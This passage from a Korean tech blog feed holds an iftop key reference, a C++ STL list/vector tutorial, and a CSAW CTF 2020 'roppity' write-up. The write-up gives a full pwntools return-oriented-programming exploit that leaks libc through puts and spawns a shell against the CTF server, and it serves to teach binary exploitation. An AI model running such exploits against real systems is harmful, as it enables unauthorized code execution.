proto protocol    프로토콜 유형<br>ether dst ehost    이더넷 목적지 주소가 ehost인지 체크<br>ether src ehost    이더넷 출발지 주소가 ehost인지 체크<br>ether host ehost    이더넷 출발지 또는 목적지 주소가 ehost인지 체크<br>gateway hostname    게이트웨이 호스트네임(IP주소)</p><h3 id="interactive-mode"><a href="#interactive-mode" class="headerlink" title="interactive-mode"></a>interactive-mode</h3><p>n    DNS Resolution on/off<br>s    Source Host Hide/UnHide<br>d    Destination Host Hide/UnHide<br>t    Cycle Line<br>N    Port Resolution on/off<br>S    Port Display(SRC) on/off<br>D    Port Display(DST) on/off<br>p    Port Display on/off<br>&lt;    Sort by Source<br>| Sort by Destination<br>o | Order by frozen/unfrozen<br>P | Pause Display<br>h | help<br>b | bar on/off<br>B | bar show 2/10/40(s) average<br>T | cumulative totals show/hide<br>j,k | scroll display<br>f | net-filter<br>l | screen-filter<br>L | lin/log scales<br>! | shell command(default: disabled)<br>q | quit</p>]]></content>
      
      
      <categories>
          
          <category> Docx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> iftop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW CTF 2020 roppity Write up</title>
      <link href="2020/09/14/csawctf-200914/"/>
      <url>2020/09/14/csawctf-200914/</url>
      
        <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><p>DEMON 소속팀에서 팀원분들과 CTF를 나가게 되었습니다~~</p><p>오랜만에 CTF를 봐서 그런지 감이 안잡히는 문제들도 많아서 많이 헤멨는데 조금 더 분발해야겠네요 ㅜ_ㅜ</p><p>앞으로 시간될때마다 팀원분들과 같이 CTF 참여해서 글 자주 포스팅 할 예정입니다 :)</p><h3 id="roppity-analysis"><a href="#roppity-analysis" class="headerlink" title="roppity(analysis)"></a>roppity(analysis)</h3><p>먼저 문제에서 주어지는 파일은 바이너리와 libc 파일입니다.</p><p>64bit 환경에서 컴파일 되었고 Memory Mitigation은 별 다른거 없이 NX BIT만 활성화 되어있습니다.</p><p>IDA로 넘어가서 조금 더 딥하게 분석해봅시다.</p><p>메인 함수 안에서 작동하는 매우 간단한 원리의 바이너리 인것을 확인할 수 있습니다.</p><p>여기서 공격 벡터로 사용할 수 있는 함수는 puts 함수인데, 해당 함수의 실제 주소를 leak 해서 rop 해주면 끝납니다!</p><p>필요한 부분들을 하나씩 찾아봅시다.</p><p>일단 입력값이 저장되는 v4 버퍼의 크기는 rbp-20(32byte) 입니다.</p><p>그리고 함수 릭을 할려면 plt, got 값을 각각 구해야하는데 gdb를 통해서 볼수도 있지만 pwntools를 이용하면 시간 절약이 가능합니다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.chal.csaw.io&#x27;</span>,<span class="number">5016</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br></pre></td></tr></table></figure><p>이런식으로 하면 puts 함수의 plt, got를 각각 구할 수 있습니다.</p><p>함수 오프셋도 똑같이 libc 파일을 불러와서 symbols로 구해주면 되니깐 이하 생략하겠습니다~</p><p>그리고 rop에서 중요한 부분은 함수 릭을 할때 함수의 인자를 정리해줘야 해서 pop gadget 필요한데 이것도 ROPgadget 도구를 이용하면 쉽게 구합니다.</p><p>puts 함수의 인자를 정리해줄려면 pop ret로 해주면 되기 때문에 pop rdi ret 가젯을 사용하면 됩니다.</p><p>그럼 이제 함수 릭까지의 익스코드를 정리해보면 아래와 같습니다</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span> <span class="comment"># 32byte + 8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line"></span><br><span class="line">payload += p64(puts_got)</span><br><span class="line"></span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure><p>아까 구했던 값들을 그대로 이용해서 함수릭을 해주면 됩니다.</p><p>중간에 main symbols을 구해서 마지막에 리턴해주는 이유는 함수 leak을 하고 다시 main 함수로 리턴해서 초기의 상태로 만들어서 공격을 수행해야 하는 간단한 이유입니다.</p><p>이제 남은 일은 libc base, system, binsh의 주소를 구해서 sh을 실행시켜주면 끝납니다.</p><p>오프셋 계산은 매우 간단합니다.</p><p>libc base 주소를 구해서 그냥 offset를 더해주면 필요한 함수의 주소가 나옵니다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br></pre></td></tr></table></figure><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.chal.csaw.io&#x27;</span>,<span class="number">5016</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x0000000000400683</span> <span class="comment"># pop rdi ret</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040048e</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">binsh_offset = <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span> <span class="comment"># 32byte + 8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line"></span><br><span class="line">payload += p64(puts_got)</span><br><span class="line"></span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line"></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(ret)</span><br><span class="line"></span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwnable </tag>
            
            <tag> ROP </tag>
            
            <tag> CSAWCTF 2020 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicoCTF 2019 Write Up</title>
      <link href="2020/09/11/picoctf-200911/"/>
      <url>2020/09/11/picoctf-200911/</url>
      
        <content type="html"><![CDATA[<p>해당 포스트 내용은 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320">https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Pwnable </tag>
            
            <tag> PicoCTF2019 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ STL(Standard Template Library)</title>
      <link href="2020/09/10/c-stl-200910/"/>
      <url>2020/09/10/c-stl-200910/</url>
      
        <content type="html"><![CDATA[<h2 id="list-linked-list"><a href="#list-linked-list" class="headerlink" title="list(linked list)"></a>list(linked list)</h2><p>list는 순서를 유지하는 구조로 이루어진 노드 기반 컨테이너입니다.</p><p>원소가 노드 단위로 저장되며, list는 이중 연결 리스트(double linked list)이고</p><p>임의 접근이 불가능하고 순차적으로 접근만 허용됩니다.</p><p>허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”)</p><h3 id="list-선언"><a href="#list-선언" class="headerlink" title="list 선언"></a>list 선언</h3><p>list it    - 빈 컨테이너 리스트 생성<br>list lt(n) - 기본값으로 초기화 된 n개위 원소를 가지는 리스트<br>list lt(n,m) - m으로 초기화 된 n개의 원소를 가지는 리스트<br>list lt(lt2) - lt2의 복사본인 lt 리스트</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;link&gt; // library</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br></pre></td></tr></table></figure><h3 id="list-생성자-예제"><a href="#list-생성자-예제" class="headerlink" title="list 생성자 예제"></a>list 생성자 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; lt1;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">lt2</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">lt3</span><span class="params">(<span class="number">100</span>, <span class="number">5</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">lt4</span><span class="params">(lt1)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lt1 size&quot;</span> &lt;&lt; lt1.size() &lt;&lt; <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lt2 size&quot;</span> &lt;&lt; lt2.size() &lt;&lt; <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lt3 size&quot;</span> &lt;&lt; lt3.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;lt4 size&quot;</span> &lt;&lt; lt4.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// lt1 == 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="list-멤버-함수"><a href="#list-멤버-함수" class="headerlink" title="list 멤버 함수"></a>list 멤버 함수</h3><p>|Name|Context<br>lt.front()| 맨 앞의 원소를 반환 및 참조한다.<br>lt.back() | 맨 뒤의 원소를 반환 및 참조한다.<br>lt.begin() | 맨 앞의 원소를 가리키는 iterator를 반환한다.<br>lt.end() | 맨 마지막의 다음 원소를 가리키는 iterator를 반환한다.<br>lt.rbegin()| 뒤에서부터 원소를 순차적으로 접근할 때 사용한다. (뒤집었을 때 첫번째)<br>lt.rend() | 뒤에서부터 원소를 순차적으로 접근할 떄 사용한다. (뒤집었을 떄 마지막)<br>lt.push_front(k) | 앞쪽으로 원소 k를 삽입한다.<br>lt.push_back(k) | 뒤쪽으로 원소 k를 삽입한다.<br>lt.pop_front() | 맨 첫번째 원소를 제거한다.<br>lt_pop_back() | 맨 마지막 원소를 제거한다.<br>lt.insert(iter, k) | iter가 가리키는 위치에 원소 k를 삽입하고 iterator를 반환한다.<br>lt.erase() | iterator가 가리키는 원소를 삭제하고, 반환값은 삭제한 원소의 다음 원소를 가리키는 iterator를 반환한다.<br>lt.size() | 원소의 개수를 반환한다.<br>lt.remove(k) | k와 같은 원소를 모두 삭제한다.<br>lt.remove_if(Predicate) | 단항 조건자 Predicate에 해당하는 원소를 모두 삭제한다.<br>lt.reverse() | 원소들의 순차열을 뒤집는다.<br>lt.sort() | 모든 원소를 오름차순으로 정렬하고, 파라미터가 오는 경우에는 파라미터를 기준으로 정렬한다.<br>lt.empty() | 리스트가 비어있으면 true를 반환하고 아닌 경우 false를 반환한다.<br>lt2.swap(lt) | lt와 lt2를 바꾼다.<br>lt2.splice(iter2, lt) | li2에서 iter2가 가리키는 lt의 모든 원소를 잘라서 붙인다.<br>lt2.unique() | 인접한 원소가 같으면 유일하게 만든다.<br>lt2.merge(lt) | lt를 lt2의 내부로 합병 정렬을 한다(기본 : 오름차순 정렬), 두번쨰 파라미터로 정렬 기준을 받을 수도 있다.</p><h3 id="list-사용-예제"><a href="#list-사용-예제" class="headerlink" title="list 사용 예제"></a>list 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; ltlist;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator lt;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator lter = ltlist.begin(); <span class="comment">// auto begin</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator lter2 = ltlist.end(); <span class="comment">// auto end</span></span><br><span class="line"></span><br><span class="line">    ltlist.push_back(<span class="number">10</span>); <span class="comment">// 뒤쪽으로 10(원소 k) 삽입</span></span><br><span class="line">    ltlist.push_back(<span class="number">11</span>); <span class="comment">// 뒤쪽으로 11(원소 k) 삽입</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ltlist.front() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 맨 앞 원소를 반환 및 참조</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ltlist.back() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 맨 뒤 원소를 반환 및 참조</span></span><br><span class="line"></span><br><span class="line">    ltlist.push_front(<span class="number">1</span>); <span class="comment">// 앞쪽으로 1(원소 k) 삽입</span></span><br><span class="line">    ltlist.push_back(<span class="number">12</span>); <span class="comment">// 뒤쪽으로 12(원소 k) 삽입</span></span><br><span class="line"></span><br><span class="line">    ltlist.pop_front(); <span class="comment">// 맨 앞쪽의 원소를 제거 == 1이 삭제되겠지?</span></span><br><span class="line">    ltlist.pop_back(); <span class="comment">// 맨 뒤쪽의 원소를 제거 == 12가 삭제되겠지?</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ltlist.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 리스트의 크기를 반환</span></span><br><span class="line"></span><br><span class="line">    lter++; <span class="comment">// 리스트 위치 +1</span></span><br><span class="line"></span><br><span class="line">    ltlist.insert(lter, <span class="number">3</span>); <span class="comment">// 리스트의 두번째 위치에 3을 삽입</span></span><br><span class="line"></span><br><span class="line">    lter2--;</span><br><span class="line"></span><br><span class="line">    ltlist.erase(lter2); <span class="comment">// 마지막 원소를 가리키는 iterator의 원소를 삭제</span></span><br><span class="line"></span><br><span class="line">    ltlist.remove(<span class="number">10</span>); <span class="comment">// 10과 같은 원소 모두 삭제</span></span><br><span class="line"></span><br><span class="line">    ltlist.reverse(); <span class="comment">// 순차열 뒤집기</span></span><br><span class="line"></span><br><span class="line">    ltlist.sort(); <span class="comment">// 오름차순 정렬</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (ltlist.empty() ? <span class="string">&quot;true&quot;</span>: <span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 리스트가 비어있는지 체크(삼항 연산자 사용)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(lt = ltlist.begin(); lt != ltlist.end(); lt++)&#123; <span class="comment">//iterator 반복문 출력 시작</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *lt &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>STL의 sequence container의 하나인 vector는 자동으로 메모리가 할당되는 배열이다.</p><p>스택과 비슷한 개념이라고 할 수 있고, 중간에 값을 넣거나 삭제할 수 있다.</p><p>허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”)</p><h3 id="vector-선언"><a href="#vector-선언" class="headerlink" title="vector 선언"></a>vector 선언</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; v1;</span><br><span class="line"><span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; v2;</span><br></pre></td></tr></table></figure><h3 id="vector-멤버-함수"><a href="#vector-멤버-함수" class="headerlink" title="vector 멤버 함수"></a>vector 멤버 함수</h3><p>|Name|Context<br>|v1.assign(a,b)| v1에 b의 값으로 a개의 원소를 할당한다.<br>|v1.at(idx)| idx번째 원소를 참조한다. (범위 점검)<br>|v1[idx]| idx번째 원소를 참조한다. (범위 점검 X)<br>|v1.front()| 첫번째 원소를 참조한다.<br>|v1.back()| 마지막 원소를 참조한다.<br>|v1.clear()| 모든 원소를 제거한다(size만 제거하고, 메모리(capacity)는 남아있다.)<br>|v1.push_back()| 마지막에 원소를 삽입한다.<br>|v1.pop_back()| 마지막 원소를 삭제한다.<br>|v1.begin()| 첫번째 원소를 가리킨다(iterator)<br>|v1.end()| 마지막 원소를 가리킨다(iterator)<br>|v1.rbegin()| 역순의 첫번째 원소를 가리킨다(reverse 개념)<br>|v1.rend()| 역순의 마지막 원소를 가리킨다(reverse 개념)<br>|v1.reserve(n)| n개의 원소를 저장할 위치를 예약한다. (동적할당)<br>|v1.resize(n)| 크기를 n으로 변경한다.<br>|v1.size()| 원소의 개수를 반환한다.<br>|v1.capacity()| 할당된 공간의 크기를 반환한다.<br>|v1.insert(a,b,c)| a의 위치에 b개의 c값을 삽입한다.<br>|v1.insert(a,b)| a의 위치에 b값을 삽입하고 iterator를 반환한다.<br>|v1.empty()| vector가 비어있는지 체크(true/false 반환)<br>|v2.swap(v1)| v1와 v2의 원소, capacity를 바꾼다(swap 개념)</p><p>여기서 size() 와 capacity()는 다르다.</p><p>size는 할당된 메모리안에 들어있는 요소의 개수를 반환하고, capacity는 할당된 메모리의 크기를 반환해주는 것이다.</p><h3 id="vector-사용-예제"><a href="#vector-사용-예제" class="headerlink" title="vector 사용 예제"></a>vector 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v1;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v2;</span><br><span class="line">    <span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt;::iterator iter;</span><br><span class="line"></span><br><span class="line">    v1.push_back(<span class="number">10</span>); <span class="comment">// 맨 뒤에 원소 삽입 아래도 동일</span></span><br><span class="line">    v1.push_back(<span class="number">9</span>);</span><br><span class="line">    v1.push_back(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(iter = v1.begin(); iter != v1.end(); iter++)&#123; <span class="comment">// iterator 반복문 선언</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *iter &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// vector v1 사이즈 반환 (10,9,8 이니 총 3개 반환)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.capacity() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// vector v1 할당 메모리 반환</span></span><br><span class="line"></span><br><span class="line">    v1.pop_back(); <span class="comment">// 맨 끝에 있는 원소를 삭제, 8이 삭제되겠지~</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//v1.clear(); // 모든 원소 삭제</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// vector v1 사이즈 반환 (clear해서 0 반환)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (v1.empty() ? <span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// vector가 비어있는지 체크(삼항 연산자 사용)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.front() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 맨 앞의 원소 반환 및 참조</span></span><br><span 